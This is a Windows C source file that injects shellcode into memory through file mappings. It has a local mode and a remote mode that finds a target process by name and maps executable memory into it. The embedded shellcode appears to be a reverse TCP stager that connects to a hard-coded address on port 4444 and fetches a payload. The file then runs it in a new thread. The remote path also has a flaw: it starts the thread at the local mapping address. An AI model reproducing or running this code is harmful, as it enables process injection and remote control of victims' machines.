#include <windows.h>
#include <tchar.h>
#include <psapi.h>
#include "tlhelp32.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#pragma comment (lib, "OneCore.lib")

//comment this to use local injection
#define USE_REMOTE_INJECTION



BOOL localmappinjection(IN PBYTE pPayload,OUT PVOID*ppAddress,IN SIZE_T sPayloadSize) {

	HANDLE hFile = NULL;
	PVOID 	pMapAddress = NULL;

	hFile = CreateFileMappingA(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, NULL, sPayloadSize, NULL);
	if (hFile == NULL) {
		printf("Can't create file mapping for our target ! ERROR : 0x%lx", GetLastError());
		return FALSE;
	}
	printf("Mapped successfully!\n");
	pMapAddress = MapViewOfFile(hFile, FILE_MAP_WRITE | FILE_MAP_EXECUTE, NULL, NULL, sPayloadSize);
	if (pMapAddress == NULL) {
		printf("Can't map the payload successfully ! ERROR : 0x%lx \n", GetLastError());
		CloseHandle(hFile);
		return FALSE;
	}
	printf("Map extracted successfully!\n");


	printf("[#] Press <Enter> To Copy The Payload ... ");
	getchar();

	printf("[i] Copying Payload To 0x%p ... ", pMapAddress);

	if (!memcpy(pMapAddress, pPayload, sPayloadSize)) {
		printf("memcpy failed with ERROR : 0x%lx\n", GetLastError());
		return FALSE;
	}

	printf("Payload copied successfully!! \n");
	printf("Press enter to exit ! \n");
	getchar();

	*ppAddress = pMapAddress;
	if (hFile)
		CloseHandle(hFile);
	return TRUE;

}


BOOL RemoteMappingInjection(IN HANDLE hProcess,PBYTE pPayload,OUT PVOID *ppAddress, IN SIZE_T sPayloadSize) {

	HANDLE hFile = NULL;
	PVOID 	pMapAddress = NULL;
	PVOID 	pMapRemoteAddress = NULL;


	hFile = CreateFileMappingA(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, NULL, sPayloadSize, NULL);
	if (hFile == NULL) {
		printf("Can't create file mapping for our target ! ERROR : 0x%lx", GetLastError());
		return FALSE;
	}
	printf("Mapped successfully!\n");
	pMapAddress = MapViewOfFile(hFile, FILE_MAP_WRITE | FILE_MAP_EXECUTE, NULL, NULL, sPayloadSize);
	if (pMapAddress == NULL) {
		printf("Can't map the payload successfully ! ERROR : 0x%lx \n", GetLastError());
		CloseHandle(hFile);
		return FALSE;
	}
	printf("Map extracted successfully!\n");


	printf("[#] Press <Enter> To Copy The Payload ... ");
	getchar();

	printf("[i] Copying Payload To 0x%p ... ", pMapAddress);

	if (!memcpy(pMapAddress, pPayload, sPayloadSize)) {
		printf("memcpy failed with ERROR : 0x%lx\n", GetLastError());
		return FALSE;
	}

	printf("Payload copied successfully!! \n");
	pMapRemoteAddress = MapViewOfFile2(hFile,hProcess,NULL,NULL,NULL,NULL,PAGE_EXECUTE_READWRITE);
	if (pMapRemoteAddress == NULL) {
		printf("Can't map the payload in the Remote process ! ERROR : 0x%lx \n", GetLastError());
		CloseHandle(hFile);
		return FALSE;
	}

	printf("\t[+] Remote Mapping Address : 0x%p \n",	pMapRemoteAddress);

	printf("Press enter to exit ! \n");
	getchar();

	*ppAddress = pMapAddress;


	if (hFile)
		CloseHandle(hFile);
	return TRUE;

}


void PrintProcessNameAndID(DWORD processID, const WCHAR* target, DWORD& foundPID) {
	TCHAR szProcessName[MAX_PATH] = TEXT("<unknown>");

	HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processID);

	if (hProcess != NULL) {
		HMODULE hMod;
		DWORD cbNeeded;

		if (EnumProcessModules(hProcess, &hMod, sizeof(hMod), &cbNeeded)) {
			GetModuleBaseName(hProcess, hMod, szProcessName, sizeof(szProcessName) / sizeof(TCHAR));
		}

		if (_wcsicmp(szProcessName, target) == 0) {
			foundPID = processID;
			wprintf(L"Target process found: %s (PID: %u)\n", szProcessName, processID);
		}

		CloseHandle(hProcess);
	}
}


void PrintAllProcesses(const WCHAR* target, DWORD& foundPID) {
	DWORD processes[1024], cbNeeded, processCount;

	if (!EnumProcesses(processes, sizeof(processes), &cbNeeded)) {
		printf("EnumProcesses failed.\n");
		return;
	}

	processCount = cbNeeded / sizeof(DWORD);

	for (unsigned int i = 0; i < processCount; i++) {
		if (processes[i] != 0) {
			PrintProcessNameAndID(processes[i], target, foundPID);
			if (foundPID != 0) {
				break;
			}
		}
	}
}

unsigned char Payload[] =
"\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50"
"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
"\x18\x48\x8b\x52\x20\x4d\x31\xc9\x48\x0f\xb7\x4a\x4a\x48"
"\x8b\x72\x50\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
"\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x0f"
"\x85\x72\x00\x00\x00\x8b\x80\x88\x00\x00\x00\x48\x85\xc0"
"\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49"
"\x01\xd0\xe3\x56\x4d\x31\xc9\x48\xff\xc9\x41\x8b\x34\x88"
"\x48\x01\xd6\x48\x31\xc0\x41\xc1\xc9\x0d\xac\x41\x01\xc1"
"\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8"
"\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44"
"\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41"
"\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83"
"\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9"
"\x4b\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33\x32\x00"
"\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00\x49"
"\x89\xe5\x49\xbc\x02\x00\x11\x5c\xac\x1a\xb7\x42\x41\x54"
"\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5"
"\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b"
"\x00\xff\xd5\x6a\x0a\x41\x5e\x50\x50\x4d\x31\xc9\x4d\x31"
"\xc0\x48\xff\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41"
"\xba\xea\x0f\xdf\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58"
"\x4c\x89\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5"
"\x85\xc0\x74\x0a\x49\xff\xce\x75\xe5\xe8\x93\x00\x00\x00"
"\x48\x83\xec\x10\x48\x89\xe2\x4d\x31\xc9\x6a\x04\x41\x58"
"\x48\x89\xf9\x41\xba\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00"
"\x7e\x55\x48\x83\xc4\x20\x5e\x89\xf6\x6a\x40\x41\x59\x68"
"\x00\x10\x00\x00\x41\x58\x48\x89\xf2\x48\x31\xc9\x41\xba"
"\x58\xa4\x53\xe5\xff\xd5\x48\x89\xc3\x49\x89\xc7\x4d\x31"
"\xc9\x49\x89\xf0\x48\x89\xda\x48\x89\xf9\x41\xba\x02\xd9"
"\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x41\x57\x59\x68"
"\x00\x40\x00\x00\x41\x58\x6a\x00\x5a\x41\xba\x0b\x2f\x0f"
"\x30\xff\xd5\x57\x59\x41\xba\x75\x6e\x4d\x61\xff\xd5\x49"
"\xff\xce\xe9\x3c\xff\xff\xff\x48\x01\xc3\x48\x29\xc6\x48"
"\x85\xf6\x75\xb4\x41\xff\xe7\x58\x6a\x00\x59\xbb\xe0\x1d"
"\x2a\x0a\x41\x89\xda\xff\xd5";




int main(int argc,char* argv[]) {
	
	PVOID	pAddress = NULL;
	HANDLE	hThread = NULL;


#ifdef USE_REMOTE_INJECTION

	//Remote mapping injection
	if (argc < 2) {
		printf("Usage: <exe> <Process Name>\n");
		return EXIT_FAILURE;
	}

	DWORD PID = 0, TID = NULL;
	WCHAR target[MAX_PATH];
	size_t convertedChars = 0;

	mbstowcs_s(&convertedChars, target, MAX_PATH, argv[1], _TRUNCATE);

	PrintAllProcesses(target, PID);


	if (PID == 0) {
		printf("Target process not found.\n");
		return EXIT_FAILURE;
	}


	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
	if (hProcess == NULL) {
		printf("Failed to open process (PID: %ld), error: %ld\n", PID, GetLastError());
		return EXIT_FAILURE;
	}

	
	printf("Process handled successfully ! \n");
	

	if (!RemoteMappingInjection(hProcess,Payload, &pAddress, sizeof(Payload))) {
		printf("Can't map! \n");
		return -1;
	}

	printf("Payload address 0x%lx", pAddress);

	printf("[i] Creating New Thread ... ");

	hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)pAddress, NULL, NULL, NULL);


	if (hThread != NULL) {
		WaitForSingleObject(hThread, INFINITE);
		printf("[+] DONE \n");
	}
	else
		printf("[!] CreateThread Failed With Error : %d \n", GetLastError());


	printf("[#] Press <Enter> To Quit ... ");
	getchar();






	//This is the Local mapping injection
#else

	if (!localmappinjection(Payload, &pAddress,sizeof(Payload))) {
		return -1;
	}

	printf("[#] Press <Enter> To Run The Payload ... ");
	getchar();
	printf("Payload address 0x%lx", pAddress);

	printf("[i] Creating New Thread ... ");

	hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)pAddress, NULL, NULL, NULL);

	
	if (hThread != NULL) {
		WaitForSingleObject(hThread, INFINITE);
		printf("[+] DONE \n");
	}
	else
		printf("[!] CreateThread Failed With Error : %d \n", GetLastError());


	printf("[#] Press <Enter> To Quit ... ");
	getchar();
#endif

	return 0;
}

